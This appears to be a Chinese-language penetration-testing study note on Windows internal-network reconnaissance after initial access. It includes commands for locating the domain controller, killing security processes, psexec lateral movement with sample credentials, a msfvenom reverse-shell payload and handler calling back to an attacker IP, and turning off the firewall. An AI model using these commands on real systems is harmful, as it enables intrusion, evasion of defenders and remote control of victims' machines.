**渗透学习 **

进入内网后首先要分析下当前主机位于什么位置，有无其他网段有无域等这些信息，今天就水一篇文章记录一下叭

分析当前服务器角色  
  

判断当前主机是web服务器/文件服务器/代理服务器/DNS服务器/存储服务器  
比如通过web进入到该服务器  
上，查看当前用户是什么角色(www-data、webber等)，尝试进行提权；  
chcp 65001可以修改编码  
![](../Images/28871745ebb55494523e918dc5ecba11.png)

判断是否有域  
  

### ipconfig /all

![](../Images/08c0baab6f588547b0ac25e0b5b195a0.png)

可以看到pa.com，这个是因为域内主机的DNS服务器ip一般设置为域控的ip  
然后使用nslookup解析该域名的ip地址  
![](../Images/08c0baab6f588547b0ac25e0b5b195a0.png)

这样不就拿到域控的ip了嘛

systeminfo  
  

systeminfo不仅可以看到是否存在于域中，还可以看到系统所打的补丁，然后根据补丁去分析还存在什么漏洞  

![](../Images/53b176deb83064e90aba2c149a5aacd7.png)

可以使用极光无限的安全扫描仪对系统的补丁信息进行扫描，看系统哪些补丁没有及时打上  
链接：https://detect.secwx.com/  
也可以使用工具查看  
system > systeminfo.txt  
wes.py systeminfo.txt  
工具链接：https://github.com/panacea-6/wesng  
![](../Images/2d834f4daa9ce3da74cf756058526fc3.png)

tasklist  
  

### tasklist看进程  
![](../Images/c78179bc097db7feb884580582fed768.png)

根据开放的进程看是否有开启杀软等，然后尝试用taskkill杀死进程  
比如杀死他的phpstudy\_pro进程  
taskkill /pid 5992 -t -f  
\-t：终止指定的进程以及由它启动的任何子进程。终止指定的进程以及由它启动的任何子进程。　  
\-f：强制结束正在运行的进程。  
再次查看tasklist发现确实是被杀死了  
![](../Images/f3385f1a23a051cf23a73b274a578cce.png)

但是一般情况下使用taskkill是杀不掉杀软的，这里以火绒为例  
![](../Images/318662ef19852469000cd2e2bad087d6.png)

net share  
  

net share看本机共享  
![](../Images/61380b744f6f88d90f314e9261e3dfcd.png)

开启了ipc$和admin$就可以利用psexec在在拿到对方主机登录名和密码，在不开放任何登录端口的情况下连接到主机  
这个工具是微软自带的  
下载地址：https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec  
执行远程命令代码：  
前提条件是对方主机必须开启ipc$（空连接）和admin$，空连接的意思也就是不用密码和用户名的IPC连接  
**开启ipc$**  
net share ipc$  
**开启admin$**  
net share admin$  
然后就可以通过得到的用户名和密码连接到跳板机  
psexec.exe \\192.168.200.11 -u administrator -p 123123 cmd  
![](../Images/8bae67a847dee09315da351673d73e96.png)

查找内网网段  
  

查找到内网网段的话才方便进行后面进一步的渗透  
1、用工具扫  
2、抓包分析网络流量  
3、文件共享链接记录、浏览器访问记录、3389连接记录

如果直接连接3389的话进行远程登录很容易就被管理员发现，管理员只需要query user就能看到当前所运行的用户  
![](../Images/84680010d6f8d76d1709f04c888841e7.png)

  
这种情况一般使用msf来反弹shell（大家应该都会了叭但我就要写略略略）  
msf生成马：  
msfvenom -p windows/meterpreter/reverse\_tcp lhost= 攻击机ip lport=xxx -f exe > x.exe  
msfvenom -p windows/meterpreter/reverse\_tcp lhost=192.168.31.194 lport=4444 -f exe > x.exe  
然后msfconsole  
\-- use exploit /windows/multi/handler  
\-- set payload windows/meterpreter/reverse\_tcp  
\-- show options看看需要设置什么参数  
\-- set lhost= 攻击机ip  
\-- exploit  
出现meterpreter就代表反弹shell成功  
![](../Images/9ab4632623d91721792fb6d19bafd66c.png)

防火墙相关  
  

netsh firewall show config 查看防火墙配置  
![](../Images/d2c16b22b9a7d40b22e51721b6ddd627.png)

关闭防火墙  
  

win2003之前  
netsh Firewall set opmode disable  
win2003之后：  
netsh advfirewall set allprofiles state off  
![](../Images/7c039a1db1e1423b10c6cce316ff56cc.png)

  

允许端口放行  
netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow
